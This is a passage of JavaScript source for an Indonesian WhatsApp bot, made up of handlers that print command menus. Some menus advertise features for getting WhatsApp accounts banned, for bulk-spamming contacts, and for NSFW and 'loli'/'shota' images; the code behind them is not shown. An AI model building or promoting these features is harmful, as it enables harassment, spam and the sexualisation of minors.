📄 ${prefix}𝚠𝚖
📄 ${prefix}𝚚𝚌
📄 ${prefix}𝚜𝚖𝚎𝚖𝚎
📄 ${prefix}𝚔𝚊𝚕𝚔𝚞𝚕𝚊𝚝𝚘𝚛
📄 ${prefix}𝚜𝚝𝚊𝚕𝚔𝚝𝚒𝚔𝚝𝚘𝚔 
📄 ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜
📄 ${prefix}𝚏𝚊𝚔𝚝𝚊𝚞𝚗𝚒𝚔
📄 ${prefix}𝚔𝚊𝚝𝚊𝚋𝚒𝚓𝚊𝚔
📄 ${prefix}𝚙𝚊𝚗𝚝𝚞𝚗
📄 ${prefix}𝚋𝚞𝚌𝚒𝚗
📄 ${prefix}𝚌𝚎𝚛𝚙𝚎𝚗


   ('Random Images')
📄 ${prefix}𝚊𝚛𝚝
📄 ${prefix}𝚊𝚠𝚘𝚘
📄 ${prefix}𝚋𝚝𝚜
📄 ${prefix}𝚌𝚘𝚐𝚊𝚗
📄 ${prefix}𝚎𝚕𝚊𝚒𝚗𝚊
📄 ${prefix}𝚎𝚡𝚘
📄 ${prefix}𝚗𝚎𝚔𝚘
📄 ${prefix}𝚎𝚕𝚏
📄 ${prefix}𝚎𝚜𝚝𝚎𝚝𝚒𝚌
📄 ${prefix}𝚔𝚊𝚗𝚗𝚊
📄 ${prefix}𝚕𝚘𝚕𝚒
📄 ${prefix}𝚜𝚑𝚘𝚝𝚊
📄 ${prefix}𝚑𝚞𝚜𝚋𝚞
📄 ${prefix}𝚠𝚊𝚒𝚏𝚞
📄 ${prefix}𝚜𝚊𝚐𝚒𝚛𝚒
📄 ${prefix}𝚜𝚑𝚒𝚗𝚘𝚋𝚞
📄 ${prefix}𝚖𝚎𝚐𝚞𝚖𝚒𝚗
📄 ${prefix}𝚠𝚊𝚕𝚕𝚗𝚒𝚖𝚎
📄 ${prefix}𝚚𝚞𝚘𝚝𝚎𝚜𝚒𝚖𝚊𝚐𝚎
📄 ${prefix}𝚔𝚒𝚕𝚕
📄 ${prefix}𝚙𝚊𝚝
📄 ${prefix}𝚕𝚒𝚌𝚔
📄 ${prefix}𝚋𝚒𝚝𝚎
📄 ${prefix}𝚢𝚎𝚎𝚝
📄 ${prefix}𝚋𝚘𝚗𝚔
📄 ${prefix}𝚠𝚒𝚗𝚔
📄 ${prefix}𝚙𝚘𝚔𝚎
📄 ${prefix}𝚗𝚘𝚖
📄 ${prefix}𝚜𝚕𝚊𝚙
📄 ${prefix}𝚜𝚖𝚒𝚕𝚎
📄 ${prefix}𝚠𝚊𝚟𝚎
📄 ${prefix}𝚋𝚕𝚞𝚜𝚑
📄 ${prefix}𝚜𝚖𝚞𝚐
📄 ${prefix}𝚐𝚕𝚘𝚖𝚙
📄 ${prefix}𝚑𝚊𝚙𝚙𝚢
📄 ${prefix}𝚍𝚊𝚗𝚌𝚎
📄 ${prefix}𝚌𝚛𝚒𝚗𝚐𝚎
📄 ${prefix}𝚑𝚒𝚐𝚑𝚏𝚒𝚟𝚎
📄 ${prefix}𝚑𝚊𝚗𝚍𝚑𝚘𝚕𝚍


   ('Text Pro')
📄 ${prefix}𝚋𝚕𝚊𝚌𝚔𝚙𝚒𝚗𝚔
📄 ${prefix}𝚗𝚎𝚘𝚗
📄 ${prefix}𝚐𝚛𝚎𝚎𝚗𝚗𝚎𝚘𝚗
📄 ${prefix}𝚊𝚍𝚟𝚊𝚗𝚌𝚎𝚐𝚕𝚘𝚠
📄 ${prefix}𝚏𝚞𝚝𝚞𝚛𝚎𝚗𝚎𝚘𝚗
📄 ${prefix}𝚜𝚊𝚗𝚍𝚠𝚛𝚒𝚝𝚒𝚗𝚐
📄 ${prefix}𝚜𝚊𝚗𝚍𝚜𝚞𝚖𝚖𝚎𝚛
📄 ${prefix}𝚜𝚊𝚗𝚍𝚎𝚗𝚐𝚛𝚊𝚟𝚎𝚍
📄 ${prefix}𝚖𝚎𝚝𝚊𝚕𝚍𝚊𝚛𝚔
📄 ${prefix}𝚗𝚎𝚘𝚗𝚕𝚒𝚐𝚑𝚝
📄 ${prefix}𝚑𝚘𝚕𝚘𝚐𝚛𝚊𝚙𝚑𝚒𝚌
📄 ${prefix}𝚝𝚎𝚡𝚝𝟷𝟿𝟷𝟽
📄 ${prefix}𝚖𝚒𝚗𝚒𝚘𝚗
📄 ${prefix}𝚍𝚎𝚕𝚞𝚡𝚎𝚜𝚒𝚟𝚎𝚛
📄 ${prefix}𝚗𝚎𝚠𝚢𝚎𝚊𝚛𝚌𝚊𝚛𝚍
📄 ${prefix}𝚋𝚕𝚘𝚘𝚍𝚏𝚛𝚘𝚜𝚝𝚎𝚍
📄 ${prefix}𝚑𝚊𝚕𝚕𝚘𝚠𝚎𝚎𝚗
📄 ${prefix}𝚓𝚘𝚔𝚎𝚛𝚕𝚘𝚐𝚘
📄 ${prefix}𝚏𝚒𝚛𝚎𝚠𝚘𝚛𝚔𝚜𝚙𝚊𝚛𝚔𝚕𝚎
📄 ${prefix}𝚗𝚊𝚝𝚞𝚛𝚎𝚕𝚎𝚊𝚟𝚎𝚜
📄 ${prefix}𝚋𝚘𝚔𝚎𝚑
📄 ${prefix}𝚝𝚘𝚡𝚒𝚌
📄 ${prefix}𝚜𝚝𝚛𝚊𝚠𝚋𝚎𝚛𝚛𝚢 
📄 ${prefix}𝚋𝚘𝚡𝟹𝚍
📄 ${prefix}𝚛𝚘𝚊𝚍𝚠𝚊𝚛𝚗𝚒𝚗𝚐
📄 ${prefix}𝚋𝚛𝚎𝚊𝚔𝚠𝚊𝚕𝚕
📄 ${prefix}𝚒𝚌𝚎𝚌𝚘𝚕𝚍
📄 ${prefix}𝚕𝚞𝚡𝚞𝚛𝚢
📄 ${prefix}𝚌𝚕𝚘𝚞𝚍
📄 ${prefix}𝚜𝚞𝚖𝚖𝚎𝚛𝚜𝚊𝚗𝚍
📄 ${prefix}𝚑𝚘𝚛𝚘𝚛𝚋𝚕𝚘𝚘𝚍
📄 ${prefix}𝚝𝚑𝚞𝚗𝚍𝚎𝚛
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'ownermenu': case 'menuowner': case 'limitfitur':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) ✓
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚗𝚘𝚠𝚊
📄 ${prefix}𝚎𝚗𝚌
📄 ${prefix}𝚕𝚒𝚜𝚝𝚘𝚗𝚕𝚒𝚗𝚎
📄 ${prefix}𝚕𝚒𝚜𝚝𝚐𝚌
📄 ${prefix}𝚜𝚑𝚞𝚝𝚍𝚘𝚠𝚗
📄 ${prefix}𝚋𝚕𝚘𝚌𝚔𝚒𝚛
📄 ${prefix}𝚞𝚗𝚋𝚕𝚘𝚌𝚔𝚒𝚛
📄 ${prefix}𝙳𝙴𝙻𝙴𝚃𝙴
📄 ${prefix}𝙻𝙸𝚂𝚃𝙿𝙲
📄 ${prefix}𝚀𝚄𝙾𝚃𝙴𝙳
📄 ${prefix}𝚔𝚞𝚍𝚎𝚝𝚊
📄 ${prefix}𝚌𝚛𝚎𝚍𝚒𝚝𝚜
📄 ${prefix}𝚐𝚎𝚝𝚒𝚍𝚐𝚌
📄 ${prefix}𝚐𝚎𝚝𝚌𝚊𝚜𝚎
📄 ${prefix}𝚌𝚛𝚎𝚊𝚝𝚎𝚐𝚌
📄 ${prefix}𝚜𝚎𝚝𝚋𝚘𝚝𝚗𝚊𝚖𝚎
📄 ${prefix}𝚜𝚎𝚝𝚋𝚘𝚝𝚋𝚒𝚘
📄 ${prefix}𝚜𝚎𝚝𝚙𝚙𝚐𝚛𝚘𝚞𝚙
📄 ${prefix}𝚍𝚎𝚕𝚙𝚙𝚐𝚌
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'cekprem':
await loading ()
vinz.sendMessage(m.chat, { image: kontol,  caption: `𝚈𝙾𝚄𝚁 𝚂𝚃𝙰𝚃𝚄𝚂📃\n𝚂𝚃𝙰𝚃𝚄𝚂 : ${isCreator ? '𝙿𝚛𝚎𝚖𝚒𝚞𝚖' : '𝙵𝚛𝚎𝚎 '}\n☏𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁 : ${m.sender.split('@')[0]}\n\n𝙳𝙰𝚃𝙰 𝙲𝚁𝙴𝙰𝚃𝙾𝚁\n𝙲𝚛𝚎𝚊𝚝𝚘𝚛: 𝗩𝗶𝗻𝘇 𝗫𝟳\n𝚈𝙾𝚄𝚃𝚄𝙱𝙴\nhttps://youtube.com/@VinzX7\n𝙶𝚁𝚄𝙱 : https://chat.whatsapp.com/DWuXHxMRK3G56DbpvuezIf\n𝙶𝚛𝚞𝚋 𝚃𝚎𝚕𝚎: https://t.me/vinzoficialx7\n\n©Powered By @Whatsapp\n` }, { quoted:fkontak })
break
case 'addmenu': case 'menuadd':
if (!isCreator) return replywalu('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) X
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚊𝚍𝚍𝚙𝚛𝚎𝚖 *𝟼𝟸𝟾𝟾𝟿𝟿/@𝚝𝚊𝚐*
📄 ${prefix}𝚍𝚎𝚕𝚙𝚛𝚎𝚖 *𝟼𝟸𝟾𝟾𝟾𝟿/@𝚝𝚊𝚐*
📄 ${prefix}𝚌𝚎𝚔𝚙𝚛𝚎𝚖
📄 ${prefix}𝚕𝚒𝚜𝚝𝚙𝚛𝚎𝚖
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'beritamenu': case 'menuberita': 
hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) ✓
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚌𝚗𝚗
📄 ${prefix}𝚌𝚗𝚋𝚌
📄 ${prefix}𝚕𝚊𝚢𝚊𝚛𝚔𝚊𝚌𝚊
📄 ${prefix}𝚍𝚊𝚒𝚕𝚢
📄 ${prefix}𝚝𝚛𝚒𝚋𝚞𝚗
📄 ${prefix}𝚒𝚗𝚍𝚘𝚣𝚘𝚗𝚎
📄 ${prefix}𝚜𝚒𝚗𝚍𝚘
📄 ${prefix}𝚝𝚎𝚖𝚙𝚘
📄 ${prefix}𝚊𝚗𝚝𝚊𝚛𝚊
📄 ${prefix}𝚔𝚘𝚗𝚝𝚊𝚗
📄 ${prefix}𝚖𝚎𝚛𝚍𝚎𝚔𝚊
📄 ${prefix}𝚔𝚘𝚖𝚙𝚊𝚜
📄 ${prefix}𝚍𝚎𝚝𝚒𝚔
📄 ${prefix}𝚘𝚔𝚎𝚣𝚘𝚗𝚎
📄 ${prefix}𝚒𝚗𝚎𝚠𝚜
📄 ${prefix}𝚓𝚊𝚕𝚊𝚗𝚝𝚒𝚔𝚞𝚜
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚝𝚟
📄 ${prefix}𝚓𝚊𝚍𝚠𝚊𝚕𝚝𝚟𝚗𝚘𝚠
📄 ${prefix}𝚒𝚗𝚏𝚘𝚐𝚎𝚖𝚙𝚊
📄 ${prefix}𝚌𝚞𝚊𝚌𝚊
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'gasmenu': case 'menugas':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
Ⓐ (Author) ✓
Ⓟ (Premium) ✓
Ⓕ (Free) X
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚋𝚊𝚗𝚗𝚎𝚍
📄 ${prefix}𝚋𝚊𝚗𝚗𝚎𝚍𝚟𝟷
📄 ${prefix}𝚟𝚎𝚛𝚒𝚏
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟷
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟸
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟹
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟺
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟻
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟼
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟽
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟾
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟿
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟷𝟶
📄 ${prefix}𝚞𝚗𝚋𝚊𝚗𝚗𝚎𝚍𝟷𝟷
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'downloadmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚙𝚕𝚊𝚢
📄 ${prefix}𝚐𝚘𝚘𝚐𝚕𝚎
📄 ${prefix}𝚑𝚍𝚛
📄 ${prefix}𝚛𝚎𝚖𝚒𝚗𝚒
📄 ${prefix}𝚝𝚘𝚞𝚛𝚕
📄 ${prefix}𝚛𝚎𝚖𝚘𝚟𝚎𝚋𝚐
📄 ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚟𝚒𝚍𝚎𝚘
📄 ${prefix}𝚝𝚒𝚔𝚝𝚘𝚔𝚖𝚙𝟹
📄 ${prefix}𝚢𝚝𝚜𝚎𝚊𝚛𝚌𝚑
📄 ${prefix}𝚢𝚝𝚖𝚙𝟹
📄 ${prefix}𝚢𝚝𝚖𝚙𝟺
📄 ${prefix}𝚐𝚒𝚝
📄 ${prefix}𝚐𝚑𝚜𝚝𝚊𝚕𝚔
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'nsfwmenu':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚋𝚕𝚘𝚠𝚓𝚘𝚋
📄 ${prefix}𝚎𝚛𝚘
📄 ${prefix}𝚊𝚛𝚖𝚙𝚒𝚝𝚜
📄 ${prefix}𝚖𝚒𝚕𝚏
📄 ${prefix}𝚑𝚎𝚗𝚝𝚊𝚒
📄 ${prefix}𝚊𝚗𝚊𝚕
📄 ${prefix}𝚑𝚘𝚕𝚘𝚎𝚛𝚘
📄 ${prefix}𝚔𝚞𝚗𝚒
📄 ${prefix}𝚔𝚎𝚝𝚊
📄 ${prefix}𝚕𝚎𝚠𝚍
📄 ${prefix}𝚏𝚎𝚖𝚍𝚘𝚖
📄 ${prefix}𝚏𝚞𝚝𝚊𝚗𝚊𝚛𝚒
📄 ${prefix}𝚎𝚛𝚘𝚢𝚞𝚛𝚒
📄 ${prefix}𝚎𝚛𝚘𝚔𝚎𝚖𝚘
📄 ${prefix}𝚑𝚎𝚗𝚝𝚊𝚒𝟺𝚎𝚟𝚎𝚛𝚢𝚘𝚗𝚎
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'funmenu':
hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚛𝚊𝚖𝚊𝚕𝚓𝚘𝚍𝚘𝚑
📄 ${prefix}𝚊𝚛𝚝𝚒𝚗𝚊𝚖𝚊
📄 ${prefix}𝚌𝚘𝚌𝚘𝚔𝚗𝚊𝚖𝚊
📄 ${prefix}𝚌𝚘𝚌𝚘𝚔𝚙𝚊𝚜𝚊𝚗𝚐𝚊𝚗
📄 ${prefix}𝚓𝚊𝚍𝚒𝚊𝚗𝚙𝚎𝚛𝚗𝚒𝚔𝚊𝚑𝚊𝚗
📄 ${prefix}𝚜𝚒𝚏𝚊𝚝𝚞𝚜𝚊𝚑𝚊
📄 ${prefix}𝚛𝚎𝚣𝚎𝚔𝚒
📄 ${prefix}𝚙𝚎𝚔𝚎𝚛𝚓𝚊𝚊𝚗
📄 ${prefix}𝚛𝚊𝚖𝚊𝚕𝚗𝚊𝚜𝚒𝚋
📄 ${prefix}𝚙𝚘𝚝𝚎𝚗𝚜𝚒𝚙𝚎𝚗𝚢𝚊𝚔𝚒𝚝
📄 ${prefix}𝚜𝚊𝚗𝚐𝚎𝚌𝚎𝚔
📄 ${prefix}𝚌𝚎𝚔𝚜𝚊𝚗𝚐𝚎
📄 ${prefix}𝚐𝚊𝚢𝚌𝚎𝚔
📄 ${prefix}𝚌𝚎𝚔𝚐𝚊𝚢
📄 ${prefix}𝚌𝚎𝚔𝚐𝚊𝚗𝚝𝚎𝚗𝚐
📄 ${prefix}𝚌𝚎𝚔𝚌𝚊𝚗𝚝𝚒𝚔
📄 ${prefix}𝚌𝚎𝚔𝚔𝚊𝚢𝚊
📄 ${prefix}𝚕𝚎𝚜𝚋𝚒𝚌𝚎𝚔
📄 ${prefix}𝚌𝚎𝚔𝚕𝚎𝚜𝚋𝚒
📄 ${prefix}𝚊𝚙𝚊𝚔𝚊𝚑
📄 ${prefix}𝚋𝚒𝚜𝚊𝚔𝚊𝚑
📄 ${prefix}𝚋𝚊𝚐𝚊𝚒𝚖𝚊𝚗𝚊𝚔𝚊𝚑
📄 ${prefix}𝚛𝚊𝚝𝚎
📄 ${prefix}𝚠𝚊𝚗𝚐𝚢
📄 ${prefix}𝚌𝚎𝚔𝚖𝚊𝚝𝚒
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'pushmenu': case 'menupush':
  hanzt = `𝐗𝐗𝐓 𝐁𝐎𝐓𝐒 𝐕𝟏
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐁𝐎𝐓𝐍𝐀𝐌𝐄 : ${botname}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐕𝐢𝐧𝐳 𝐗𝟕
𝐎𝐖𝐍𝐄𝐑 : ${ownNumb}
𝐖𝐀𝐊𝐓𝐔 : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
𝐂𝐀𝐋𝐄𝐍𝐃𝐄𝐑 : ${calender}
𝐏𝐑𝐄𝐅𝐈𝐗 : ⌈𝐌𝐔𝐋𝐓𝐈⌋
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
📄 ${prefix}𝚙𝚞𝚜𝚑𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚙𝚞𝚜𝚑𝚔𝚘𝚗𝚝𝚊𝚔𝟸
📄 ${prefix}𝚓𝚙𝚖
📄 ${prefix}𝚓𝚙𝚖𝟸
📄 ${prefix}𝚐𝚎𝚝𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚜𝚊𝚟𝚎𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚜𝚎𝚗𝚍𝚔𝚘𝚗𝚝𝚊𝚔
📄 ${prefix}𝚜𝚎𝚗𝚍𝚔𝚘𝚗𝚝𝚊𝚐
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
𝐗𝐗𝐓 𝐓𝐄𝐀𝐌 𝐁𝐎𝐓𝐒
`
vinz.sendMessage(m.chat, { 
text: hanzt,
contextInfo:{
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hay Kak ${pushname} 👋 Selamat ${ucapanWaktu}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync('./imagebot.jpg'),
"mediaUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`,
"sourceUrl": `https://instagram.com/vinz_x77?igshid=YTQwZjQ0NmI0OA==`
}
}
}, { quoted: m })
break
case 'cucimata':
